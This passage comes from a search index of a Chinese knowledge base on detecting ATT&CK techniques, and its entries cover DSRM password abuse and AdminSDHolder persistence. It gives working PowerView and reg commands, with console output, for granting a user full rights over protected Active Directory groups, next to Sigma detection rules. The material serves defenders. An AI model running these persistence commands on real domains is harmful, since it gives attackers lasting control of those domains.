HASH\uff0c\u4f7f\u7528mimikatz\u8fdb\u884cHASH\u4f20\u9012\u8fdb\u884c\u653b\u51fb\uff0c\u8fbe\u5230\u4ee5DC\u672c\u5730\u8d26\u6237administrator\u7684\u5bc6\u7801\u8fdb\u884c\u767b\u5f55\u8bbf\u95eeDC\u3002","title":"0x03 \u4f7f\u7528DSRM\u51ed\u8bc1\u7684\u4e00\u79cd\u66f4\u4e3a\u9ad8\u7ea7\u7684\u65b9\u6cd5"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#_4","text":"windows \u5b89\u5168\u65e5\u5fd74794","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#sigma","text":"title: \u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\uff08DSRM\uff09\u5e10\u6237\u4e0a\u7684\u5bc6\u7801\u66f4\u6539 status: \u7a33\u5b9a description: \u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\uff08DSRM\uff09\u5e10\u6237\u662f\u57df\u63a7\u5236\u5668\u4e0a\u7684\u672c\u5730\u7ba1\u7406\u5458\u5e10\u6237\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u66f4\u6539\u5bc6\u7801\u4ee5\u83b7\u5f97\u6301\u4e45\u6027\u3002 references: - https://adsecurity.org/?p=1714 tags: - attack.persistence - attack.privilege_escalation - attack.t1098 logsource: product: windows service: security detection: selection: EventID: 4794 #\u8bd5\u56fe\u8bbe\u7f6e\u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\u7ba1\u7406\u5458\u5bc6\u7801 condition: selection falsepositives: - Initial installation of a domain controller level: high","title":"Sigma\u89c4\u5219"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#_6","text":"1.\u76d1\u63a7\u4e0eDSRM\u5bc6\u7801\u91cd\u7f6e\u548c\u4f7f\u7528\u76f8\u5173\u7684\u4e8b\u4ef6\u65e5\u5fd7 4794\uff1a\u8bd5\u56fe\u8bbe\u7f6e\u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\u7ba1\u7406\u5458\u5bc6\u7801\u3002 2.\u76d1\u63a7\u5982\u4e0b\u6ce8\u518c\u8868\u4f4d\u7f6e\u7684\u503c\uff0c\u5f53\u503c\u4e3a 1 \u6216 2\u65f6\uff0c\u5e94\u5f15\u8d77\u8b66\u793a HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DSRMAdminLogonBehavior","title":"\u5efa\u8bae"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1078-001-win-DSRM%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81/#_7","text":"MITRE-ATT&CK-T1078-001 https://attack.mitre.org/techniques/T1078/001/ \u57df\u63a7\u6743\u9650\u6301\u4e45\u5316\u4e4bDSRM https://www.freebuf.com/articles/system/80968.html \u5de7\u7528DSRM\u5bc6\u7801\u540c\u6b65\u5c06\u57df\u63a7\u6743\u9650\u6301\u4e45\u5316 https://www.uedbox.com/post/10269/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/","text":"T1098-Windows-AdminSDHolder \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u548c\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002 \u6d4b\u8bd5\u6848\u4f8b AdminSDHolder\u662f\u4e00\u4e2a\u7279\u6b8a\u7684AD\u5bb9\u5668\uff0c\u5177\u6709\u4e00\u4e9b\u9ed8\u8ba4\u5b89\u5168\u6743\u9650\uff0c\u7528\u4f5c\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\u7684\u6a21\u677f\u3002 Active Directory\u5c06\u91c7\u7528AdminSDHolder\u5bf9\u8c61\u7684ACL\u5e76\u5b9a\u671f\u5c06\u5176\u5e94\u7528\u4e8e\u6240\u6709\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\uff0c\u4ee5\u9632\u6b62\u610f\u5916\u548c\u65e0\u610f\u7684\u4fee\u6539\u5e76\u786e\u4fdd\u5bf9\u8fd9\u4e9b\u5bf9\u8c61\u7684\u8bbf\u95ee\u662f\u5b89\u5168\u7684\u3002 \u5982\u679c\u80fd\u591f\u4fee\u6539AdminSDHolder\u5bf9\u8c61\u7684ACL\uff0c\u90a3\u4e48\u4fee\u6539\u7684\u6743\u9650\u5c06\u81ea\u52a8\u5e94\u7528\u4e8e\u6240\u6709\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\uff0c\u8fd9\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u57df\u73af\u5883\u6743\u9650\u7ef4\u6301\u7684\u65b9\u6cd5\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u5b8c\u6574\u5229\u7528\u8fc7\u7a0b 1.\u679a\u4e3e\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\u4e2d\u7684\u4fe1\u606f \u67e5\u627e\u6709\u4ef7\u503c\u7684\u7528\u6237\uff0c\u9700\u8981\u786e\u8ba4\u8be5\u7528\u6237\u662f\u5426\u5c5e\u4e8e\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\uff0c\u6392\u9664\u66fe\u7ecf\u5c5e\u4e8e\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\u3002 2.\u5411AdminSDHolder\u5bf9\u8c61\u6dfb\u52a0ACL \u4f8b\u5982\u6dfb\u52a0\u7528\u6237testa\u5bf9AdminSDHolder\u7684\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\u3002 \u9ed8\u8ba4\u7b49\u5f8560\u5206\u949f\u4ee5\u540e\uff0ctesta\u83b7\u5f97\u5bf9\u6240\u6709\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\u7684\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\u3002 \u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u6ce8\u518c\u8868\u7684\u65b9\u5f0f\u8bbe\u7f6e\u6743\u9650\u63a8\u9001\u7684\u95f4\u9694\u65f6\u95f4\uff0c\u6ce8\u518c\u8868\u4f4d\u7f6e\u5982\u4e0b\uff1a HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters,AdminSDProtectFrequency,REG_DWORD \u4f8b\u5982\u4fee\u6539\u6210\u7b49\u5f85600\u79d2\u7684\u547d\u4ee4\u5982\u4e0b\uff1a reg add hklm\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters/v AdminSDProtectFrequency /t REG_DWORD/d 600 \u53c2\u8003\u8d44\u6599\uff1a https://blogs.technet.microsoft.com/askds/2009/05/07/five-common-questions-about-adminsdholder-and-sdprop/ \u6ce8\uff1a\u4e0d\u5efa\u8bae\u964d\u4f4e\u9ed8\u8ba4\u95f4\u9694\u65f6\u95f4\uff0c\u56e0\u4e3a\u5728\u5927\u578b\u73af\u5883\u4e2d\u53ef\u80fd\u4f1a\u5bfc\u81f4LSASS\u6027\u80fd\u4e0b\u964d\u3002 3.\u83b7\u5f97\u5bf9\u6574\u4e2a\u57df\u7684\u63a7\u5236\u6743\u9650 (1)\u7528\u6237testa\u80fd\u591f\u5411\u57df\u7ba1\u7406\u5458\u7ec4\u6dfb\u52a0\u5e10\u6237\u3002 \u9a8c\u8bc1\u6743\u9650\u7684\u547d\u4ee4\u5982\u4e0b\uff1a Import-Module .\\PowerView.ps1 Get-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | ?{$_.IdentityReference-match'xiaomi'} (2)\u7528\u6237testa\u80fd\u591f\u76f4\u63a5\u8bbf\u95ee\u57df\u63a7\u5236\u5668\u4e0a\u7684\u6587\u4ef6\u3002 \u6d4b\u8bd5\u8fc7\u7a0b 1.\u67e5\u8be2AdminSDHolder\u5bf9\u8c61\u7684ACL \u67e5\u8be2AdminSDHolder\u5bf9\u8c61\u7684ACL\u7b49\u4ef7\u4e8e\u67e5\u8be2\"CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org\"\u7684ACL\u3002 \u547d\u4ee4\u5982\u4e0b\uff1a Import-Module .\\PowerView.ps1 Get-ObjectAcl -ADSprefix \"CN=AdminSDHolder,CN=System\"|select IdentityReference \u771f\u5b9e\u6d4b\u8bd5\u60c5\u51b5 PS C:\\Users\\Administrator\\Desktop\\mimikatz_trunk> Import-Module .\\PowerView.ps1 PS C:\\Users\\Administrator\\Desktop\\mimikatz_trunk> Get-ObjectAcl -ADSprefix \"CN=AdminSDHolder,CN=System\"|select IdentityR eference IdentityReference ----------------- NT AUTHORITY\\Authenticated Users NT AUTHORITY\\SYSTEM BUILTIN\\Administrators XIAOMI\\Domain Admins XIAOMI\\Enterprise Admins Everyone NT AUTHORITY\\SELF NT AUTHORITY\\SELF BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Windows Authorization Access Group BUILTIN\\Terminal Server License Servers BUILTIN\\Terminal Server License Servers XIAOMI\\Cert Publishers 2.\u5411AdminSDHolder\u5bf9\u8c61\u6dfb\u52a0ACL \u6dfb\u52a0\u7528\u6237xiaomi\u7684\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a Import-Module .\\PowerView.ps1 Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName xiaomi -Verbose -Rights All \u6ce8\u610f:\u672c\u6587\u63d0\u5230\u7684\u767e\u5ea6\u793e\u533a\u53c2\u8003\u94fe\u63a5\u6b64\u5904\u5b58\u5728\u95ee\u9898\u3002\u662fRights\u4e0d\u662f\u6587\u4e2d\u63d0\u5230\u7684Right \u771f\u5b9e\u6d4b\u8bd5\u60c5\u51b5 PS C:\\Users\\Administrator\\Desktop\\mimikatz_trunk> Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -Principal SamAccountName xiaomi -Verbose -Rights All \u8be6\u7ec6\u4fe1\u606f: Get-DomainSearcher search string: LDAP://CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org \u8be6\u7ec6\u4fe1\u606f: Get-DomainSearcher search string: LDAP://DC=xiaomi,DC=org \u8be6\u7ec6\u4fe1\u606f: Granting principal S-1-5-21-3576461989-1381017913-248049510-1104 'All' on CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org \u8be6\u7ec6\u4fe1\u606f: Granting principal S-1-5-21-3576461989-1381017913-248049510-1104 '00000000-0000-0000-0000-000000000000' rights on CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org 3.\u9a8c\u8bc1\u7528\u6237\u6743\u9650 \u7b49\u5f85\u516d\u5341\u5206\u949f\u540e\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u67e5\u8be2\u7528\u6237xiaomi\u7684\u6743\u9650\uff1a Import-Module .\\PowerView.ps1 Get-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | ?{$_.IdentityReference-match'xiaomi'} OR Get-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | select IdentityReference 4.\u5220\u9664AdminSDHolder\u4e2d\u6307\u5b9a\u7528\u6237\u7684ACL \u641c\u7d22\u6761\u4ef6\u4e3a\"LDAP://CN=AdminSDHolder,CN=System,DC=test,DC=com\" \u5220\u9664\u7528\u6237xiaomi\u7684\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\uff0c\u547d\u4ee4\u5982\u4e0b\uff08\u6267\u884c\u5931\u8d25\uff09\uff1a Remove-DomainObjectAcl -TargetSearchBase \"LDAP://CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org\" -PrincipalIdentity xiaomi -Rights All -Verbose \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u65e5\u5fd7 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: Windows-AdminSDHolder description: Windows server 2008 R2\uff08AD\u57df\u63a7\uff09 references: - https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md - https://github.com/0Kee-Team/WatchAD/blob/master/modules/detect/event_log/persistence/AdminSDHolder.py tags: 1098 status: \u6d4b\u8bd5\u9636\u6bb5 author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 5136 #\u5df2\u4fee\u6539\u76ee\u5f55\u670d\u52a1\u5bf9\u8c61\u3002AdminSDHolder\u66f4\u6539\uff0c\u4e00\u822c\u7528\u4f5c\u6743\u9650\u7ef4\u6301\uff0c\u56e0\u4e3a\u66f4\u6539\u60c5\u51b5\u6781\u5c11 selection2: EventID: 4780 #ACL\u8bbe\u7f6e\u5728\u7ba1\u7406\u5458\u7ec4\u6210\u5458\u7684\u5e10\u6237\u4e0a timeframe: last 1h #\u9ed8\u8ba4\u7b49\u5f8560\u5206\u949f\u4e4b\u540e\u751f\u6548\uff0c\u5177\u4f53\u539f\u56e0\u53ef\u53c2\u8003\u4e0b\u9762SDPROP\u8bf4\u660e condition: all of them level: medium \u5efa\u8bae \u65e0 \u53c2\u8003\u63a8\u8350 \u57df\u6e17\u900f\u2014\u2014AdminSDHolder https://anquan.baidu.com/article/877 PowerView https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 SDPROP\u8bf4\u660e https://xz.aliyun.com/t/7276 MITRE-ATT&CK-T1098 https://attack.mitre.org/techniques/T1098/","title":"T1098-Windows-AdminSDHolder"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#t1098-windows-adminsdholder","text":"","title":"T1098-Windows-AdminSDHolder"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#attck","text":"\u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u548c\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_1","text":"AdminSDHolder\u662f\u4e00\u4e2a\u7279\u6b8a\u7684AD\u5bb9\u5668\uff0c\u5177\u6709\u4e00\u4e9b\u9ed8\u8ba4\u5b89\u5168\u6743\u9650\uff0c\u7528\u4f5c\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\u7684\u6a21\u677f\u3002 Active Directory\u5c06\u91c7\u7528AdminSDHolder\u5bf9\u8c61\u7684ACL\u5e76\u5b9a\u671f\u5c06\u5176\u5e94\u7528\u4e8e\u6240\u6709\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\uff0c\u4ee5\u9632\u6b62\u610f\u5916\u548c\u65e0\u610f\u7684\u4fee\u6539\u5e76\u786e\u4fdd\u5bf9\u8fd9\u4e9b\u5bf9\u8c61\u7684\u8bbf\u95ee\u662f\u5b89\u5168\u7684\u3002 \u5982\u679c\u80fd\u591f\u4fee\u6539AdminSDHolder\u5bf9\u8c61\u7684ACL\uff0c\u90a3\u4e48\u4fee\u6539\u7684\u6743\u9650\u5c06\u81ea\u52a8\u5e94\u7528\u4e8e\u6240\u6709\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\uff0c\u8fd9\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u57df\u73af\u5883\u6743\u9650\u7ef4\u6301\u7684\u65b9\u6cd5\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_4","text":"1.\u679a\u4e3e\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\u4e2d\u7684\u4fe1\u606f \u67e5\u627e\u6709\u4ef7\u503c\u7684\u7528\u6237\uff0c\u9700\u8981\u786e\u8ba4\u8be5\u7528\u6237\u662f\u5426\u5c5e\u4e8e\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\uff0c\u6392\u9664\u66fe\u7ecf\u5c5e\u4e8e\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\u3002 2.\u5411AdminSDHolder\u5bf9\u8c61\u6dfb\u52a0ACL \u4f8b\u5982\u6dfb\u52a0\u7528\u6237testa\u5bf9AdminSDHolder\u7684\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\u3002 \u9ed8\u8ba4\u7b49\u5f8560\u5206\u949f\u4ee5\u540e\uff0ctesta\u83b7\u5f97\u5bf9\u6240\u6709\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\u7684\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\u3002 \u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u6ce8\u518c\u8868\u7684\u65b9\u5f0f\u8bbe\u7f6e\u6743\u9650\u63a8\u9001\u7684\u95f4\u9694\u65f6\u95f4\uff0c\u6ce8\u518c\u8868\u4f4d\u7f6e\u5982\u4e0b\uff1a HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters,AdminSDProtectFrequency,REG_DWORD \u4f8b\u5982\u4fee\u6539\u6210\u7b49\u5f85600\u79d2\u7684\u547d\u4ee4\u5982\u4e0b\uff1a reg add hklm\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters/v AdminSDProtectFrequency /t REG_DWORD/d 600 \u53c2\u8003\u8d44\u6599\uff1a https://blogs.technet.microsoft.com/askds/2009/05/07/five-common-questions-about-adminsdholder-and-sdprop/ \u6ce8\uff1a\u4e0d\u5efa\u8bae\u964d\u4f4e\u9ed8\u8ba4\u95f4\u9694\u65f6\u95f4\uff0c\u56e0\u4e3a\u5728\u5927\u578b\u73af\u5883\u4e2d\u53ef\u80fd\u4f1a\u5bfc\u81f4LSASS\u6027\u80fd\u4e0b\u964d\u3002 3.\u83b7\u5f97\u5bf9\u6574\u4e2a\u57df\u7684\u63a7\u5236\u6743\u9650 (1)\u7528\u6237testa\u80fd\u591f\u5411\u57df\u7ba1\u7406\u5458\u7ec4\u6dfb\u52a0\u5e10\u6237\u3002 \u9a8c\u8bc1\u6743\u9650\u7684\u547d\u4ee4\u5982\u4e0b\uff1a Import-Module .\\PowerView.ps1 Get-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | ?{$_.IdentityReference-match'xiaomi'} (2)\u7528\u6237testa\u80fd\u591f\u76f4\u63a5\u8bbf\u95ee\u57df\u63a7\u5236\u5668\u4e0a\u7684\u6587\u4ef6\u3002","title":"\u5b8c\u6574\u5229\u7528\u8fc7\u7a0b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_5","text":"1.\u67e5\u8be2AdminSDHolder\u5bf9\u8c61\u7684ACL \u67e5\u8be2AdminSDHolder\u5bf9\u8c61\u7684ACL\u7b49\u4ef7\u4e8e\u67e5\u8be2\"CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org\"\u7684ACL\u3002 \u547d\u4ee4\u5982\u4e0b\uff1a Import-Module .\\PowerView.ps1 Get-ObjectAcl -ADSprefix \"CN=AdminSDHolder,CN=System\"|select IdentityReference \u771f\u5b9e\u6d4b\u8bd5\u60c5\u51b5 PS C:\\Users\\Administrator\\Desktop\\mimikatz_trunk> Import-Module .\\PowerView.ps1 PS C:\\Users\\Administrator\\Desktop\\mimikatz_trunk> Get-ObjectAcl -ADSprefix \"CN=AdminSDHolder,CN=System\"|select IdentityR eference IdentityReference ----------------- NT AUTHORITY\\Authenticated Users NT AUTHORITY\\SYSTEM BUILTIN\\Administrators XIAOMI\\Domain Admins XIAOMI\\Enterprise Admins Everyone NT AUTHORITY\\SELF NT AUTHORITY\\SELF BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Pre-Windows 2000 Compatible Access BUILTIN\\Windows Authorization Access Group BUILTIN\\Terminal Server License Servers BUILTIN\\Terminal Server License Servers XIAOMI\\Cert Publishers 2.\u5411AdminSDHolder\u5bf9\u8c61\u6dfb\u52a0ACL \u6dfb\u52a0\u7528\u6237xiaomi\u7684\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a Import-Module .\\PowerView.ps1 Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName xiaomi -Verbose -Rights All \u6ce8\u610f:\u672c\u6587\u63d0\u5230\u7684\u767e\u5ea6\u793e\u533a\u53c2\u8003\u94fe\u63a5\u6b64\u5904\u5b58\u5728\u95ee\u9898\u3002\u662fRights\u4e0d\u662f\u6587\u4e2d\u63d0\u5230\u7684Right \u771f\u5b9e\u6d4b\u8bd5\u60c5\u51b5 PS C:\\Users\\Administrator\\Desktop\\mimikatz_trunk> Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -Principal SamAccountName xiaomi -Verbose -Rights All \u8be6\u7ec6\u4fe1\u606f: Get-DomainSearcher search string: LDAP://CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org \u8be6\u7ec6\u4fe1\u606f: Get-DomainSearcher search string: LDAP://DC=xiaomi,DC=org \u8be6\u7ec6\u4fe1\u606f: Granting principal S-1-5-21-3576461989-1381017913-248049510-1104 'All' on CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org \u8be6\u7ec6\u4fe1\u606f: Granting principal S-1-5-21-3576461989-1381017913-248049510-1104 '00000000-0000-0000-0000-000000000000' rights on CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org 3.\u9a8c\u8bc1\u7528\u6237\u6743\u9650 \u7b49\u5f85\u516d\u5341\u5206\u949f\u540e\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u67e5\u8be2\u7528\u6237xiaomi\u7684\u6743\u9650\uff1a Import-Module .\\PowerView.ps1 Get-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | ?{$_.IdentityReference-match'xiaomi'} OR Get-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | select IdentityReference 4.\u5220\u9664AdminSDHolder\u4e2d\u6307\u5b9a\u7528\u6237\u7684ACL \u641c\u7d22\u6761\u4ef6\u4e3a\"LDAP://CN=AdminSDHolder,CN=System,DC=test,DC=com\" \u5220\u9664\u7528\u6237xiaomi\u7684\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\uff0c\u547d\u4ee4\u5982\u4e0b\uff08\u6267\u884c\u5931\u8d25\uff09\uff1a Remove-DomainObjectAcl -TargetSearchBase \"LDAP://CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org\" -PrincipalIdentity xiaomi -Rights All -Verbose","title":"\u6d4b\u8bd5\u8fc7\u7a0b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_6","text":"windows\u5b89\u5168\u65e5\u5fd7","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_7","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#sigma","text":"title: Windows-AdminSDHolder description: Windows server 2008 R2\uff08AD\u57df\u63a7\uff09 references: - https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md - https://github.com/0Kee-Team/WatchAD/blob/master/modules/detect/event_log/persistence/AdminSDHolder.py tags: 1098 status: \u6d4b\u8bd5\u9636\u6bb5 author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 5136 #\u5df2\u4fee\u6539\u76ee\u5f55\u670d\u52a1\u5bf9\u8c61\u3002AdminSDHolder\u66f4\u6539\uff0c\u4e00\u822c\u7528\u4f5c\u6743\u9650\u7ef4\u6301\uff0c\u56e0\u4e3a\u66f4\u6539\u60c5\u51b5\u6781\u5c11 selection2: EventID: 4780 #ACL\u8bbe\u7f6e\u5728\u7ba1\u7406\u5458\u7ec4\u6210\u5458\u7684\u5e10\u6237\u4e0a timeframe: last 1h #\u9ed8\u8ba4\u7b49\u5f8560\u5206\u949f\u4e4b\u540e\u751f\u6548\uff0c\u5177\u4f53\u539f\u56e0\u53ef\u53c2\u8003\u4e0b\u9762SDPROP\u8bf4\u660e condition: all of them level: medium","title":"Sigma\u89c4\u5219"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_8","text":"\u65e0","title":"\u5efa\u8bae"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_9","text":"\u57df\u6e17\u900f\u2014\u2014AdminSDHolder https://anquan.baidu.com/article/877 PowerView https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 SDPROP\u8bf4\u660e https://xz.aliyun.com/t/7276 MITRE-ATT&CK-T1098 https://attack.mitre.org/techniques/T1098/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/","text":"T1098-win-\u4e07\u80fd\u5bc6\u7801 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 